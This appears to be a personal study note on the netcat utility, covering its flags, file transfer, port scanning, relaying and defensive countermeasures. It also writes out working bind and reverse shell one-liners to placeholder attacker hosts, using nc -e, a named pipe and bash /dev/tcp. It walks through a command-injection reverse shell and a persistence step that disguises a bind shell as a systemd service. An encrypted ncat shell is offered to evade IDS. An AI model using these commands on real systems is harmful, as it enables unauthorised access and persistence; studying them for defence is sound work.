- Netcat (`nc`) is a versatile networking utility often called the "Swiss Army Knife" of TCP/ID.
- It reads and writes data across network connections using [[TCP]] or [[UDP]].
- It can:
	- Act as a simple TCP/UDP client or server.
	- Transfer files.
	- Port scan.
	- Banner grab.
	- Set up remote shells (bind/reverse).
	- Proxy or relay traffic.
	- Act as a makeshift chat server.
```text
Common flags
===================================
-l                Listen mode (wait for incoming connection)
-p <port>         Local port number (source port for client, listen port for server)
-s <addr>         Local source address
-4                Use IPv4 only
-6                Use IPv6 only
-u                Use UDP instead of TCP
-v                Verbose output (use -vv for more verbosity)
-w <sec>          Timeout for connections and final netcat operations
-n                Do not resolve hostnames via DNS (numeric only)
-z                Zero-I/O mode (used for scanning, send no data)
-k                (OpenBSD) Keep listening after client disconnects (multi-client)
-K                (GNU netcat) Keep listening after client disconnects? (varies)
-e <program>      Execute program after connection (e.g. /bin/bash) *insecure, often missing in OpenBSD*
-c <command>      Execute command (some versions use -c instead of -e)
-q <sec>          After EOF on stdin, wait specified seconds then quit (GNU netcat)
                  (OpenBSD uses -w for this)
-i <sec>          Delay interval for lines sent, or between port scans
-G <hop>          Source routing hop pointer (rare)
-g <gateway>      Loose source routing hop list (up to 8, rare)
-T <tos>          Set IP Type of Service
-o <file>         Hex dump of traffic (some versions)
-x <addr:port>    Proxy server address and port (HTTP/SOCKS, in Ncat)
--proxy-type <type>  Proxy protocol (http, socks4, socks5) (Ncat)
--ssl             Use SSL/TLS (Ncat)
--ssl-cert        Specify certificate file (Ncat)
--ssl-key         Specify private key (Ncat)
--sh-exec <cmd>   Like -e but compatible with OpenBSD netcat (Ncat)
--allow <hosts>   Allow only given hosts (Ncat)
--deny <hosts>    Deny given hosts (Ncat)
--max-conns <n>   Max simultaneous connections (Ncat)
--chat            Start a simple chat server (Ncat)
--broker          Connection broker mode (Ncat)
-C, --crlf        Send CRLF as line-ending (useful for HTTP)
-d                Detach from stdin (background, some Windows versions)
-t                Answer TELNET negotiation (some versions)
-r                Randomize local and remote ports
```
- Original netcat (Hobbit) supports `-e` to execute a program after connection.
- OpenBSD netcat removed `-e` and `-c` for security; you must use redirections or named pipes to get a shell.
- `ncat` (from [[Nmap]]) adds SSL, connection brokering, allow/deny lists, proxy support, and `--sh-exec` as a safer replacement for `-e`.
## Core Modes of Operation
### Connect Mode (Client)
```bash
nc [options] <host> <port>
```
Netcat connects to a remote host and sends/receives data from stdin/stdout. This is how you interact with a service, transfer files, or connect to a bind shell.
### Listen Mode (Server)
```bash
nc -l -p <port> [options]
```
Netcat waits for an inbound connection. When a client connects, data is relayed to/from the process that started netcat (its stdin/stdout). Combined with `-e`, you can hand the connected socket to a shell, called bind shell.
## Bind Shell vs. Reverse Shell
There are 2 ways to obtain remote command execution via netcat.
### Bind Shell
The victim machine opens a port and listens; the attacker connects to it.
```bash
# Victim
nc -lvp 4444 -e /bin/bash # if -e is available (Linux, GNU netcat)
```
```bash
# Attacker
nc <victim_IP> 4444
```
- Victim’s `nc` binds to port 4444, and upon connection executes `/bin/bash` with its input/output attached to the network socket.
- Attacker connects and gets a shell prompt directly.
- Downsides:
	- Firewalls usually block inbound connections to random ports.
	- Requires the victim to have a routable IP (no NAT) or the attacker to be on the same network.
	- Easily detected by host-based IDS (a process listening on an unusual port).
### Reverse Shell
The attacker sets up a listener, and the victim connects back to the attacker. This is far more common in penetration testing because outbound connections are often allowed.
```bash
# Attacker
nc -lvp 4444
```
```bash
#Victim
nc <attacker_IP> 4444 -e /bin/bash
```
- Now the attacker’s `nc` receives the victim’s shell.  
- Why it works:
	- Most networks allow outbound TCP connections (web browsing, updates).
	- NAT on the victim side is irrelevant because the connection is initiated outbound.
	- Firewalls rarely filter egress by port unless strictly configured.
## Netcat without the `-e` Option (OpenBSD Variant)
Since OpenBSD netcat deliberately lacks `-e`, you can still get a shell by using pipes, named pipes, or file descriptors.
- Reverse Shell without -e
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/bash -i 2>&1 | nc <attacker_IP> 4444 > /tmp/f
```
- A named pipe (`fifo`) connects the output of netcat back into bash’s input, creating a loop.
- Bind Shell without -e
```bash
# Victim
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/bash -i 2>&1 | nc -l -p 4444 > /tmp/f
```
```bash
# Attacker
nc <victim_IP> 4444
```
- Another method (using file descriptors) works on some shells:
```bash
/bin/bash -i >& /dev/tcp/<attacker_IP>/4444 0>&1
```
- This relies on bash’s built-in `/dev/tcp` pseudo-device and does not need netcat on the victim at all.
---
### Staged vs. Stageless Payloads
- In frameworks like [[Metasploit]], a stager is a tiny piece of code that connects back and downloads the full payload.
- A common stager downloads and executes a larger reverse shell binary.
- Netcat-like commands are typically stageless: the whole shell command runs in one line.
### Web Shells
- When [[HTTP and HTTPS|HTTP/HTTPS]] is the only protocol allowed out, attackers may upload a web shell (PHP, ASPX) instead of using raw TCP.
- Netcat can still be used to handle the callback, but the initial foothold uses the web server.
### DNS / [[ICMP]] Tunnels
- If all outbound ports except [[DNS]] (UDP 53) are blocked, reverse shells can be wrapped inside DNS queries.
- Netcat alone can’t do this, but it’s the same principle; You need a listener that decapsulates the tunnel.
### Port Forwarding & Relays
- Netcat can act as a simple proxy/relay to reach machines deeper in a network.
```bash
mkfifo backpipe
nc -l -p 8080 < backpipe | nc <internal_host> 80 > backpipe
```
- Every connection to port 8080 gets forwarded to `<internal_host>:80`.
## Use Cases
### Simple Connectivity Test
Check if a remote port is open and receiving data:
```bash
# -z for scan mode, -v verbose. Quickly validates firewall rules.
nc -zv <host> 22
```
### Banner Grabbing
```bash
nc <host> 80 <<< ""
# or
echo "" | nc <host> 80
```
Then manually type `HEAD / HTTP/1.0` and press Enter twice. You’ll see server headers.
### File Transfer
```bash
# Receiver
nc -lvp 5555 > received_file

# Sender
nc <receiver_IP> 5555 < secret_document.pdf
```
After transmission, the connection closes automatically (use `-q 1` on GNU netcat to wait 1s before closing). This works in either direction (bind or reverse).
### Quick Chat Server
```bash
# Machine A
nc -l -p 1234

# Machine B
nc <MachineA_IP> 1234
```
Whatever you type on one side appears on the other.
### Basic Port Scanner
```bash
nc -zv <target> 20-100 2>&1 | grep succeeded
```
Scans TCP ports 20-100. For UDP scanning, add `-u`.
### Penetration Test: Initial Reverse Shell
You’ve found a command injection vulnerability in a web application that runs on an internal server. Outbound TCP is allowed.
1. On your attack machine (public IP):
```bash
nc -lvp 443
```
Port 443 often bypasses egress filters because it’s HTTPS.
2. Inject into the vulnerable app:
```bash
nc <your_IP> 443 -e /bin/sh
```
If no `-e`, use `/dev/tcp` bash trick or a FIFO. You receive a shell as the web server user.
### Post-Exploitation: Persistence with Bind Shell
After gaining root on an internal Linux server, you want a backup entry method that doesn’t require a reverse callback. Set up a bind shell disguised as a system service:
1. Create a systemd unit file that runs:
```bash
# Use -k on OpenBSD to keep the listener alive after each dc, beware security.
nc -l -p 2323 -e /bin/bash
```
2. Enable it. Now you can [[SSH]] into the DMZ jump box and from there connect to the internal server on port 2323 anytime.
### Evading IDS with Encryption
Instead of plain-text reverse shells, use Ncat’s [[SSL]] to blend in with HTTPS traffic:
```bash
# Attacker
ncat --ssl -lvp 443

# Victim
ncat --ssl <attacker_IP> 443 -e /bin/bash
```
Deep packet inspection often ignores encrypted streams.
### Simple Honeypot/Logger
Listen on port 22 to capture any connection attempts and write them to a log:
```bash
nc -lvp 22 >> honeypot.log
```
Leave it running. Every banner, every credential brute-force attempt gets recorded in plain text.
### Minimal Web Server
```bash
while true; do
  echo -e "HTTP/1.1 200 OK\n\n $(date)" | nc -l -p 8080 -q 1;
done
```
Browse to `http://<IP>:8080`; you’ll see the current date. Demonstrates netcat’s ability to serve one request per connection.
### Security Implications:
- **Netcat as a hacking tool:** Any shell spawned via `nc` runs in the clear, trivial to detect by network IDS signatures (`uid=0` string in TCP stream).
- **Defensive measures:**
    - Block unnecessary outbound ports at the perimeter firewall (egress filtering).
    - Use application whitelisting to prevent execution of `nc` by unauthorized processes.
    - Deploy host intrusion detection that monitors for process lineage like bash to nc.
    - Replace standard netcat with OpenBSD netcat (no `-e`), or remove netcat entirely.
    - Encrypted reverse shells (`ncat --ssl`) are harder to detect, requiring TLS interception.
- **Forensic evidence:** Netcat shells often appear in syslog, shell history, or file system artifacts (named pipes in `/tmp`). Defenders can look for unusual listening ports with `netstat` and unusual outbound connections.